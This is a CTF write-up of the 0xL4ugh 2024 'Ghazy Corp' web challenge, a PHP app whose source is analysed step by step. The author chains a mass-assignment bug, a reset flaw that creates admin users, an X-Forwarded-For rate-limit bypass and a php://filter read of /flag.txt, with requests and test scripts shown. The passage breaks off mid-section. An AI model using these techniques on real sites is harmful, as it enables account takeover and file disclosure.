# Ghazy Corp

## Table of Contents

 1. [Overview](#overview)  
 2. [Background](#background)  
 3. [Enumeration](#enumeration)  
    3.1. [Admin Dashboard](#admin-dashboard)  
    3.2. [User Photo](#user-photo)  
    3.3. [Admin Login Page](#admin-login-page)  
    3.4. [User Login Page](#user-login-page)  
    3.5. [Flawed Reset Password Mechanism](#flawed-reset-password-mechanism)  
    3.6. [Mass Assignment Vulnerability](#mass-assignment-vulnerability)  
 4. [Exploitation](#exploitation)  
    4.1. [Register a New `confirmed` User Account By Exploiting Mass Assignment Vulnerability](#register-a-new-confirmed-user-account-by-exploiting-mass-assignment-vulnerability)  
    4.2. [Escalate to Admin Account By Exploiting Flawed Reset Password Mechanism](#escalate-to-admin-account-by-exploiting-flawed-reset-password-mechanism)  
    4.3. [Leak the Flag File Content By Exploiting Blind File Oracle With PHP Filter Chains](#leak-the-flag-file-content-by-exploiting-blind-file-oracle-with-php-filter-chains)  
 5. [Conclusion](#conclusion)

## Overview    

- Solved by: @siunam
- 19 solves / 442 points
- Difficulty: Hard
- Author: abdoghazy
- Overall difficulty for me (From 1-10 stars): ★★★★★★☆☆☆☆

## Background

Welcome to my corp.

/mail is just to simulating mail service it shouldn't be vulnerable to something that will help you solving this challenge

[Link](http://20.55.48.101/)

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211182124.png)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211182142.png)

In the index page, we can login to an account. Also, it has 2 links that allow us to reset password ("Forget password?") and create a new account ("Sign Up?").

In here, we can try to enter some dummy credentials and see what will happen:

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211182435.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211182443.png)

If we entered an incorrect credential, it'll pop up an alert box with text "Wrong Creds".

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211182521.png)

When we clicked the "Login" button, it'll send a POST request to `/` with parameter `email`, `password`, and `login-submit`.

Now, let's create a new account at `/register.php`!

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211182801.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211182808.png)

Oh! Looks like **we need to use the challenge's mail system at endpoint `/mail`**!

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211182909.png)

When we clicked the "register" button, it'll send a POST request to `/register.php` with parameter `email`, `password`, and `register-submit`.

Hmm... Let's create a new mail account then!

> Note: The challenge's description specifically says that **the mail system shouldn't be vulnerable**. 

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211183132.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211183140.png)

And login to our newly created mail account:

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211183321.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211183332.png)

Currently, our mail inbox is empty.

**Now that we have a mail account in the challenge's mail system, let's create a new account in `/register.php`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211183446.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211183454.png)

Then login to our new account:

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211183539.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211183604.png)

Uhh... "Your Account is not confirmed"?

**After clicking "OK" on the alert box, we'll be redirected to `/user_confirm.php`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211183651.png)

**Also, in our mail inbox, there's a new mail:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211183741.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211183748.png)

Hmm... Looks like they stopped account activation...

**In endpoint `/forget_password.php`, we can enter our email address to reset password:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211183920.png)

No much we can explore in here, let's read this application's source code.

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/Web/Ghazy-Corp/Corp_-_ToGive.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/0xL4ugh-CTF-2024/Web/Ghazy-Corp)-[2024.02.11|18:40:41(HKT)]
└> file Corp_-_ToGive.zip    
Corp_-_ToGive.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
┌[siunam♥Mercury]-(~/ctf/0xL4ugh-CTF-2024/Web/Ghazy-Corp)-[2024.02.11|18:40:43(HKT)]
└> unzip Corp_-_ToGive.zip    
Archive:  Corp_-_ToGive.zip
  inflating: flag.txt                
  inflating: init.db                 
  inflating: init.sh                 
   creating: src/
  inflating: src/admin_login.php     
  inflating: src/dashboard.php       
  inflating: src/db.php              
  inflating: src/example.png         
  inflating: src/forget_password.php  
  inflating: src/index.php           
  inflating: src/logout.php          
   creating: src/mail/
  inflating: src/mail/index.php      
  inflating: src/mail/logout.php     
  inflating: src/mail/mail.php       
  inflating: src/mail/mail_view.php  
   creating: src/mail/scripts/
  inflating: src/mail/scripts/admin.js  
  inflating: src/mail/scripts/bootstrap.bundle.min.js  
  inflating: src/mail/scripts/bootstrap.min.js  
  inflating: src/mail/scripts/jquery-1.11.1.min.js  
  inflating: src/mail/scripts/jquery.min.js  
   creating: src/mail/style/
  inflating: src/mail/style/bootstrap.min.css  
  inflating: src/mail/style/font-awesome.min.css  
  inflating: src/rate-limiting.php   
  inflating: src/rate_limit_config.json  
  inflating: src/register.php        
  inflating: src/reset_password.php  
  inflating: src/user_confirm.php    
  inflating: src/user_photo.php      
  inflating: src/utils.php           
  inflating: src/wrong_reset_token.php  
  inflating: Dockerfile              
```

After reading the source code for a little while, I found that **the flag file is in `/flag.txt`** (from `Dockerfile`), and other interesting things.

### Admin Dashboard

**`src/dashboard.php`:**
```php
<?php
session_start();
require_once("db.php");
if(!isset($_SESSION['user_id']))
{
    die("<script>window.location.href='index.php';</script>");
}


if ($_SESSION["role"]!=="admin")
{
    die("You are not admin,hahaha<br><a href='logout.php'>Click Here</a> to logout");
}

$stmt = $conn->prepare("select * from users");
$stmt->execute();
$res=$stmt->get_result();


?>

<html lang="en">
<head>
<meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ghazy Corp</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" >
    <link href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" rel="stylesheet" >
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/js/bootstrap.bundle.min.js"></script>
    <script src="//code.jquery.com/jquery-1.11.1.min.js"></script>  
</head>
<body>
<table class="table">
<thead>
    <tr>
    <th scope="col">#</th>
    <th scope="col">email</th>
    <th scope="col">photo</th>
    </tr>
</thead>
<tbody>
<?php $count=0;while ($user=$res->fetch_assoc()){?>
    <tr>
    <th scope="row"><?=++$count;?></th>
    <td><?=$user["email"]?></td>
    <td><a href="user_photo.php?id=<?=$user['id']?>">Click Here to view user photo</a></td>
    </tr>
    <?php }?>
    </tbody>
</table>
</body>
</html>
```

In `dashboard.php`, we can see that **this page requires `admin` role**. If an admin user request this page, he/she can read all the registered users' email address and view their user photo.

### User Photo

**`src/user_photo.php`:**
```php
<?php
session_start();
error_reporting(0);
require_once('rate-limiting.php');

if(!isset($_SESSION['user_id'])||!isset($_SESSION['role'])||$_SESSION['role']!=="admin" )
{
    die("Not Authorized");
}
echo "Still Under Development<Br>";
if(!empty($_POST['img']))
{
    $name=$_POST['img'];
    $content=file_get_contents($name);
    if(bin2hex(substr($content,1,3))==="504e47") // PNG magic bytes
    {
        echo "<img src=data:base64,".base64_encode($content);
    }
    else
    {
        echo "Not allowed";
    }
}


?>
```

In this page, it **also requires `admin` role**. If authorized and POST request parameter `img` is provided, it'll presumably **get the parameter `img`'s value's URL image**. If the content of the fetched image has PNG file magic bytes, it'll render the image using `<img>` element and `src` attribute in base64 encoded. However, it's worth noting that **the `<img>` tag was never closed**, so the image shouldn't get rendered.

Hmm... Maybe we the built-in PHP function `file_get_contents()` is vulnerable in this case? We'll get to that later.

Now, I wonder how an admin user is going to login.

### Admin Login Page

**`src/admin_login.php`:**
```php
<?php
session_start();
require_once("db.php");
if (!empty($_SESSION['user_id']))
{
    die("<script>window.location.href='dashboard.php';</script>");
}


if(isset($_POST['login-submit']))
{
    if(!empty($_POST['email'])&&!empty($_POST['password']))
    {
        $email=$_POST['email'];
        $password=md5($_POST['password']);
        $stmt = $conn->prepare("select * from admins where email=? and password=?");
        $stmt->bind_param("ss", $email, $password);
        $stmt->execute();
        $res=$stmt->get_result();
        if($res->num_rows >0)
        {
            $user=$res->fetch_assoc();
            if ($user['confirmed']===1)
            {
                $_SESSION["email"]=$user["email"];
                $_SESSION["user_id"]=$user['id'];
                $_SESSION["role"]="admin";
                $_SESSION["confirmed"]=$user["confirmed"];
                echo "<script>window.location.href='dashboard.php';</script>";
            }
            else
            {
                $_SESSION["confirmed"]=0;
                $_SESSION["not_confirmed_user_id"]=$user['id'];
                echo "<script>alert('Your Account is not confirmed');window.location.href='user_confirm.php';</script>";
            }
        }
        else
        {
            echo "<script>alert('Wrong Creds')</script>";
        }

    }
    else
    {
        echo "<script>alert('Please Fill All Fields')</script>";
    }
}
?>
[...HTML stuff (same as the index login page)...]
```

When a POST request parameter `login-submit`, `email`, and `password` is provided, **it uses a prepared statement to execute the SQL query** (So it's not vulnerable to SQL injection), which fetches the admin user **from table `admins`**.

Then, if the admin user is confirmed (the `confirmed` value is `1`), **the session cookie will set `role` to `admin`**.

### User Login Page

**`src/index.php`:**
```php
<?php
        [...]
        $stmt = $conn->prepare("select * from users where email=? and password=?");
        $stmt->bind_param("ss", $email, $password);
        $stmt->execute();
        $res=$stmt->get_result();
        if($res->num_rows >0)
        {
            $user=$res->fetch_assoc();
            if ($user['confirmed']===1)
            {
                $_SESSION["email"]=$user["email"];
                $_SESSION["user_id"]=$user['id'];
                $_SESSION["role"]="user";
                $_SESSION['level']=$user["level"];
                $_SESSION["confirmed"]=$user["confirmed"];
                echo "<script>window.location.href='dashboard.php';</script>";
            }
            else
            [...]
?>
[...HTML stuff (same as the admin login page)...]
```

Although the majority of the PHP code are the same as the admin login page (`admin_login.php`), there're something different.

The SQL query is fetched **from table `users`**, the `role` is set to `user`, and another `level` attribute is set to the user's level.

### Flawed Reset Password Mechanism

**`src/reset_password.php`:**
```php
<?php
session_start();
require_once("db.php");
require_once("utils.php");

if(!empty($_SESSION['reset_token1']) && !empty($_SESSION['reset_email']))
{
    if(!empty($_GET['email']) && !empty($_GET['token1']) && !empty($_GET['token2']) && !empty($_GET['new_password']))
    {
        $email=$_GET['email'];
        $token1=(int)$_GET['token1'];
        $token2=(int)$_GET['token2'];
        if(strlen($_GET['new_password']) < 10)
        {
            die("Plz choose password +10 chars");
        }
        $password=md5($_GET['new_password']);
        if($token1 === $_SESSION['reset_token1'] && $token2===$_SESSION['reset_token2'] && $email===$_SESSION['reset_email'])
        {

            $uuid=guidv4();
            $stmt=$conn->prepare("insert into admins(email,password,level,confirmed) values(?,?,1,1)"); // inserting instead of updating to avoid any conflict.
            $stmt->bind_param("ss",$email,$password);
            if($stmt->execute())
            {
                unset($_SESSION['reset_email']);
                unset($_SESSION['reset_token1']);
                unset($_SESSION['reset_token2']);
                echo "<script>alert('User Updated Successfully');window.location.href='index.php';</script>";
            }

        }
        else
        {
            unset($_SESSION['reset_token1']);
            unset($_SESSION['reset_token2']);
            // to be implemented : send mail with the new tokens
            echo "<script>alert('Wrong Token');window.location.href='wrong_reset_token.php?email=$email';</script>";
        }
    }
    else
    {
        echo "please enter email,token,new_password";
    }
}
else
{
    die("<script>window.location.href='forget_password.php'</script>");
}

?>
```

In here, when the session cookie has `reset_token1` and `reset_email`, as well as GET parameter `email`, `token1`, `token2`, and `new_password` is provided, ***it'll create a new ADMIN user*** (What?).

**More specifically, take a look at the SQL query:**  
```php
$stmt=$conn->prepare("insert into admins(email,password,level,confirmed) values(?,?,1,1)"); // inserting instead of updating to avoid any conflict.
```

Did you see any problem in this SQL query?

Yeah, the SQL query is **inserting the data into table `admins`**, NOT table `users`!!!

That being said, **we can actually create a new admin user just by resetting our password**!

But wait, **how `reset_token1`, `token1`, and `token2` is being generated?**

**`src/forget_password.php`:**
```php
<?php
session_start();

require_once('db.php');
require_once("utils.php");


if(isset($_POST['recover-submit']))
{
    if(!empty($_POST['email']))
    {
        $email=$_POST['email'];
        if(filter_var($email, FILTER_VALIDATE_EMAIL))
        {
            $stmt=$conn->prepare("select * from users where email=?");
            $stmt->bind_param("s", $email);
            $stmt->execute();
            $res=$stmt->get_result();
            if($res->num_rows > 0)
            {
                $target_user=$res->fetch_assoc();
                if($target_user['confirmed']===1)
                {
                    $level=(int)$target_user['level'];
                    generate_reset_tokens($email,$level);
                    send_forget_password_mail($email);
                    echo "<script>window.location.href='reset_password.php';</script>";
                }
                else
                {
                    die("<script>alert('Your Account is not confirmed');window.location.href='user_confirm.php';</script>");
                }
            }
            else
            {
                die("<script>alert('Your Email doesnt exist in our db');window.location.href=history.back();</script>");
            }
        }
        else
        {
            die("<script>alert('This is not valid email');window.location.href=history.back();</script>");
        }
    }
    else
    {
        die("<script>alert('Please Enter Your email');window.location.href=history.back();</script>");
    }
}
?>
[...HTML stuff...]
```

In here, when POST request with parameter `recover-submit` and `email` is sent, it'll fetch our user's confirmation status.

If the user confirmation status is confirmed (`$target_user['confirmed']===1`), it'll run function `generate_reset_tokens()` with argument `$email`, `$level` and `send_forget_password_mail()` with argument `$email` from `src/utils.php`.

**First, let's take a look at function `generate_reset_tokens()`:**
```php
[...]
function generate_reset_tokens($email,$level)
{
    $_SESSION['reset_email']=$email;
    $_SESSION['reset_token1']=mt_rand();
    for($i=0;$i<$level;$i++)
    {
        mt_rand();
    }
    $_SESSION['reset_token2']=mt_rand();

    // Generating another values in case the user entered wrong token
    $_SESSION['reset_token3']=mt_rand();
    $_SESSION['reset_token4']=mt_rand();
}
[...]
```

After the function is being called, it'll set our session data with `reset_email` to our email address, `reset_token1-4` to a random value generated from built-in PHP function `mt_rand()`.

According to the [PHP documentation about function `mt_rand()`](https://www.php.net/manual/en/function.mt-rand.php), it says that **this function is not cryptographically secure**, which means the random value can be predicated:

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211194303.png)

Also, function `generate_reset_tokens()` loops through our user's level to call function `mt_rand()` for some reason? Anyways, let's continue.

**Then, what about function `send_forget_password_mail()`?**
```php
[...]
function send_forget_password_mail($email)
{
    global $conn;
    $email_id=guidv4();
    $email_content="Here is your reset password tokens: ".$_SESSION['reset_token1'].", ".$_SESSION['reset_token2'];
    $stmt=$conn->prepare("insert into mails(id,content,user_id) values(?,?,(select id from mail_users where email=?))");
    $stmt->bind_param("sss", $email_id,$email_content,$email);
    $stmt->execute();
}
[...]
```

In here, it'll simply insert a new mail into our mail inbox, **with the content of `reset_token1` and `reset_token2`, which are the `token1`, and `token2` in `src/reset_password.php`.**

However, generating `reset_token`s **require our user account is `confirmed`**... How can we do that if the application stopped account activation??

### Mass Assignment Vulnerability

Fortunately, we can create an account with `confirmed = 1`! 

**`src/register.php`:**
```php
<?php
session_start();
require_once("db.php");
require_once("utils.php");
if (!empty($_SESSION['user_id']))
{
    die("<script>window.location.href='dashboard.php';</script>");
}



if(isset($_POST['register-submit']))
{
    if(!empty($_POST['email'])&&!empty($_POST['password']))
    {
        $email=$_POST['email'];
        $password=$_POST['password'];   
        $stmt = $conn->prepare("select * from users where email=?");
        $stmt->bind_param("s", $email);
        $stmt->execute();
        $res=$stmt->get_result();
        
        
        if($res->num_rows ===1)
        {
            die("<script>alert('email taken');window.location.href=history.back();</script>");
        }
        elseif(!filter_var($email, FILTER_VALIDATE_EMAIL))
        {
            die("<script>alert('This is not valid email');window.location.href=history.back();</script>");
        }
        elseif(!mail_system_exist(htmlspecialchars($email)))
        {
            die("<script>alert('You must use email from our mail system at /mail');window.location.href=history.back();</script>");
        }
        elseif(strlen($password) < 10)
        {
            die("<script>alert('Plz Choose Passsword +10 chars');window.location.href=history.back();</script>");
        }
        else
        {
            $data=safe_data($_POST);
            $placeholders = implode(', ', array_fill(0, count($data), '?'));
            $sql = "INSERT INTO users (" . implode(', ', array_keys($data)) . ") VALUES (" . $placeholders . ")";
            $stmt = $conn->prepare($sql);
            if ($stmt) 
            {
                $types = str_repeat('s', count($data));  
                $stmt->bind_param($types, ...array_values($data));
            
                if ($stmt->execute()) 
                {
                    send_registration_mail($email);
                    echo "<script>alert('User Created Successfully');window.location.href='index.php';</script>";
                } 
                else 
                {
                    echo "<script>alert('Error1')</script>";
                }
            
                $stmt->close();
            } 
            else 
            {
                echo "<script>alert('Error2')</script>";
            }
        }

    }
    else
    {
        echo "Please Fill All Fields";
    }
}
?>
[...HTML stuff...]
```

In here, when POST request parameter `register-submit`, `email`, and `password` is provided, a new user will be inserted into table `users`. However, there're something unusual.

**Let's take a closer look at the logic:**
```php
[...]
    $data=safe_data($_POST);
    $placeholders = implode(', ', array_fill(0, count($data), '?'));
    $sql = "INSERT INTO users (" . implode(', ', array_keys($data)) . ") VALUES (" . $placeholders . ")";
    $stmt = $conn->prepare($sql);
    if ($stmt) 
    {
        $types = str_repeat('s', count($data));  
        $stmt->bind_param($types, ...array_values($data));
    
        if ($stmt->execute()) 
        {
            send_registration_mail($email);
            echo "<script>alert('User Created Successfully');window.location.href='index.php';</script>";
        } 
        else 
        [...]
```

**First, Our POST request body data is being parsed into function `safe_data()` from `src/utils.php`:**
```php
[...]
function safe_data($data)
{
    $keys=array_keys($data);
    $values=array_values($data);
    for($i=0;$i<count($data);$i++)
    {
        if ($keys[$i]==="register-submit")
        {
            continue;
        }
        $safe_key=preg_replace("/[^a-zA-Z0-9]/s","",$keys[$i]);
        $safe_value=preg_replace("/[^a-zA-Z0-9@\.]/s","",$values[$i]);
        if($safe_key==="password")
        {
            $safe_value=md5($safe_value);
        }
        
        $safe_array[$safe_key]=$safe_value;
    }
    
    return $safe_array;
}
[...]
```

**In this function, it'll loop through all the POST request parameter name as `keys`, parameter name's value as `values`:**
```php
<?php
// create an array similar to $_POST
$postData = "email=siunam@siunam321.github.io&password=12345678910&register-submit=";

$data = array();
$keyValuePairs = explode('&', $postData);
foreach ($keyValuePairs as $pair) {
    $parts = explode('=', $pair);    
    $data[$parts[0]] = $parts[1];
}

$keys = array_keys($data);
$values = array_values($data);

print_r($keys);
print_r($values);
?>
```

```shell
┌[siunam♥Mercury]-(~/ctf/0xL4ugh-CTF-2024/Web/Ghazy-Corp/test)-[2024.02.11|20:21:39(HKT)]
└> php test.php
Array
(
    [0] => email
    [1] => password
    [2] => register-submit
)
Array
(
    [0] => siunam@siunam321.github.io
    [1] => 12345678910
    [2] => 
)
```

Then, it'll loop through all the POST request parameters and filters out unwanted parameters.

**However, this still doesn't stop us from injecting another parameters:**
```php
<?php
require_once("../src/utils.php");

// create an array similar to $_POST
$postData = "email=siunam@siunam321.github.io&password=12345678910&register-submit=&foobar=blah";
echo "[*] POST request body data:\n$postData\n";

$data = array();
$keyValuePairs = explode('&', $postData);
foreach ($keyValuePairs as $pair) {
    $parts = explode('=', $pair);
    $data[$parts[0]] = $parts[1];
}
echo "[+] Before filtering:\n";
print_r($data);

$safe_array = safe_data($data);
echo "[+] After filtering:\n";
print_r($safe_array);
?>
```

```shell
┌[siunam♥Mercury]-(~/ctf/0xL4ugh-CTF-2024/Web/Ghazy-Corp/test)-[2024.02.11|20:32:09(HKT)]
└> php test.php
[*] POST request body data:
email=siunam@siunam321.github.io&password=12345678910&register-submit=&foobar=blah
[+] Before filtering:
Array
(
    [email] => siunam@siunam321.github.io
    [password] => 12345678910
    [register-submit] => 
    [foobar] => blah
)
[+] After filtering:
Array
(
    [email] => siunam@siunam321.github.io
    [password] => 432f45b44c432414d2f97df0e5743818
    [foobar] => blah
)
```

So, it basically do nothing.

After "filtering" our POST request body parameters, it'll prepare placeholders for the prepared SQL statement. For example, if the POST request body has 2 parameters, it'll create a string like `?, ?`. It'll also prepare the column names with the parameters. So the SQL query will become something like this:

```sql
INSERT INTO users (email, password) VALUES (?, ?)
```

Then, it'll bind the prepared statement's parameter with our POST request body parameters. In our case it'll be:

```php
$stmt->bind_param("ss", "siunam@siunam321.github.io", "432f45b44c432414d2f97df0e5743818");
```

Finally, it'll execute the prepared statement and send a registration email to our inbox.

Hmm... Since if we inject new parameters it won't get filters out, **we can insert as many data into table `users` as we want**!

For instance, **if we inject a parameter called `confirmed`, with value `1`, the SQL statement will also very welcomely insert the parameter into the table**!

```php
<?php
require_once("../src/utils.php");

// create an array similar to $_POST
$postData = "email=siunam@siunam321.github.io&password=12345678910&register-submit=&confirm=1";
echo "[*] POST request body data:\n$postData\n";

$data = array();
$keyValuePairs = explode('&', $postData);
foreach ($keyValuePairs as $pair) {
    $parts = explode('=', $pair);
    $data[$parts[0]] = $parts[1];
}
echo "[+] Before filtering:\n";
print_r($data);

$safe_array = safe_data($data);
echo "[+] After filtering:\n";
print_r($safe_array);

$placeholders = implode(', ', array_fill(0, count($safe_array), '?'));
$sql = "INSERT INTO users (" . implode(', ', array_keys($safe_array)) . ") VALUES (" . $placeholders . ")";
echo "[*] SQL query: $sql\n";

$types = str_repeat('s', count($safe_array));
$bindParamString = $types . ", " . implode(', ', array_values($safe_array));

echo "[*] Function bind_param value: bind_param($bindParamString)\n";
?>
```

```shell
┌[siunam♥Mercury]-(~/ctf/0xL4ugh-CTF-2024/Web/Ghazy-Corp/test)-[2024.02.11|20:56:03(HKT)]
└> php test.php
[*] POST request body data:
email=siunam@siunam321.github.io&password=12345678910&register-submit=&confirm=1
[+] Before filtering:
Array
(
    [email] => siunam@siunam321.github.io
    [password] => 12345678910
    [register-submit] => 
    [confirm] => 1
)
[+] After filtering:
Array
(
    [email] => siunam@siunam321.github.io
    [password] => 432f45b44c432414d2f97df0e5743818
    [confirm] => 1
)
[*] SQL query: INSERT INTO users (email, password, confirm) VALUES (?, ?, ?)
[*] Function bind_param value: bind_param(sss, siunam@siunam321.github.io, 432f45b44c432414d2f97df0e5743818, 1)
```

Hence, `src/register.php` is vulnerable to **mass assignment**, which **allows us to make our user account to be `confirmed`**. 

## Exploitation

Putting all the pieces of puzzles back together, we can now become an admin user!!

### Register a New `confirmed` User Account By Exploiting Mass Assignment Vulnerability

- First, create a new mail account: (We can't use the same email address to register a new user account)

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211223603.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211223613.png)

- Secondly, exploiting mass assignment vulnerability in `/register.php`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211223737.png)

- Finally, login as our newly created user account:

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211223816.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211223827.png)

As expected, we're still not an admin user. Let's head over to the reset password mechanism to escalate our privilege to admin!

### Escalate to Admin Account By Exploiting Flawed Reset Password Mechanism

- First, go to `/forget_password.php` and enter our email address:

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211223948.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211224011.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211224031.png)

After that, we'll be redirected to `/reset_password.php`.

- Secondly, login to our mail account and get the reset tokens:

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211224117.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211224129.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211224140.png)

- Finally, send a GET request to `/reset_password.php` with parameter `email`, `token1`, `token2`, and `new_password`:

```http
GET /reset_password.php?email=siunam1@siunam321.github.io&token1=1645798213&token2=1769211537&new_password=12345678910
Host: 20.55.48.101
Cookie: PHPSESSID=e6a96b84c7537d8fb797b1ee7f2e64d1
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211224401.png)

**Now, we should be able to login as an admin user at `/admin_login.php`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211224433.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211224455.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211224550.png)

Nice! We're now an admin user!

### Leak the Flag File Content By Exploiting Blind File Oracle With PHP Filter Chains 

Hmm... What now? If we go to **`/user_photo.php`** (GET method), it just returns "Still Under Development":

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211224733.png)

If we send a POST request with parameter `img`, it'll try to fetch the parameter's value URL image. In this challenge, it has a PNG file called `example.png`. Maybe we can test with that image:

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211225202.png)

Yeah, as expected, it'll just return the `<img>` element.

But what if we **try to use [PHP wrappers](https://www.php.net/manual/en/wrappers.php) to read the flag file**? Like `php://filter/convert.base64-encode/resource=/flag.txt`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211232234.png)

Ah... The flag file's content doesn't contain PNG magic bytes...

Now, let's look deeper into `src/user_photo.php`!

**In the source code, it also included another PHP script called `rate-limiting.php` from `src/rate-limiting.php`:**
```php
<?php
session_start();
error_reporting(0);
require_once('rate-limiting.php');
[...]
?>
```

Uh... Wait, **why rate limiting is implemented on this page**?

**I don't know, let's take a look at `src/rate-limiting.php` anyway:**
```php
<?php
[...]
// GET CONTENTS OF OUR CONFIG FILE
try
{
    $config = file_get_contents("rate_limit_config.json");
}
catch(Exception $f)
{
    die(push_error("Cannot open file! Looking for \"rate_limit_config.json\". Invalid permissions?"));
}

// PARSE CONFIG FILE
$config = json_decode($config, TRUE);
$config = $config[0];

// ESTABLISH DB FILE NAME
$dbFileName = $config["database_file_name"];
[...]
// GET TRUE IP
if (!empty($_SERVER['HTTP_CLIENT_IP']))
{
    $ip = $_SERVER['HTTP_CLIENT_IP'];
}

elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
{
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
else
{
    $ip = $_SERVER['REMOTE_ADDR'];
}
[...]
// PUSH THIS REQUEST TO NEW DB
array_push($newDb, array("ip" => $ip, "time" => date("Y-m-d H:i:s"), "user-agent" => $_SERVER['HTTP_USER_AGENT'])); 

//SAVE THE DATABASE
file_put_contents($dbFileName, json_encode($newDb));

[...]
if ($dbIndexable)
{
    // RATE LIMITING
    foreach ($newDb as $id)
    {
        // FOR EACH LINE IN $uniqueIds: compare with each line to chack lfor amount of requests in our db from x seconds time.
        $hits = 0;
        foreach ($newDb as $id_1)
        {
            if ($id_1["ip"] == $id["ip"])//&& $id["user-agent"] == $id_1["user-agent"])
            {
                $hits++;
            }
        }
        // IF THEY EXCEED OUR RATE THEN die() or redirect:
        if ($hits >= $config["request_allowance"])
        {
            if ($config['die_on_rate_limit'])
            {
                die("You are being rate-limited!");
            }
            //ELSE:
            header('Location: '.$config['redirect_location']);
        }
    }
}
[...]
?>
```

**`src/rate_limit_config.json`:**
```json
[
    {
        "database_file_name": "requests.json",
        "interval_time_seconds": 30,
        "request_allowance": 5,
        "redirect_location": "https://google.com",
        "die_on_rate_limit": true 
    }
]
```

> Note: Since the source code is a little bit big, I extracted some important parts of it.

As you can see, **within every 30 seconds time window**, if we send requests to `/user_photo.php` **more than 5 times**, we're being rate limited.

Luckily, since the `hits` is **based on our IP address** and request header **`X-Forwarded-For`** is supported, it's completely **bypassable with that header**!

**Therefore, we can use request header `X-Forwarded-For` to bypass the rate limiting:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/0xL4ugh-CTF-2024/images/Pasted%20image%2020240211230551.png)

But still, this doesn't explain WHY rate limiting is implemented. Until...

**In the `src/rate-limiting.php`, the `requests.json` database file (From `src/rate_limit_config.json`) is actually written to the webroot directory:**
```php
[...]
// PARSE CONFIG FILE
